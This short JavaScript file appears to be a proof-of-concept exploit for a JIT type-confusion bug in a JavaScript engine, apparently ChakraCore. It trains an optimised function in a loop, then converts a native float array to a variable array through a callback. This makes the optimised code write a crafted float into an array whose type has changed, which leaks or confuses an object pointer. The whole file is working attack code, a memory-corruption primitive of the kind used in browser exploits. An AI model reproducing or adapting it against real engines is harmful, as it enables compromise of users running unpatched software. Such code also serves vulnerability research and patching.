function inlinee() {
  new Error();
  return inlinee.arguments[0];
}

function opt(convert_to_var_array) {
  /*
  To make the in-place type conversion happen, it requires to segment.
  */
  let stack_arr = []; // JavascriptNativeFloatArray

  stack_arr[10000] = 1.1;
  stack_arr[20000] = 2.2;
  let heap_arr = inlinee(stack_arr);
  convert_to_var_array(heap_arr);
  stack_arr[10000] = 2.3023e-320;
  return heap_arr[10000];
}

function main() {
  for (let i = 0; i < 10000; i++) {
    opt(new Function('')); // Prevents to be inlined
  }

  print(opt(heap_arr => {
    heap_arr[10000] = {}; // ConvertToVarArray
  }));
}

main();
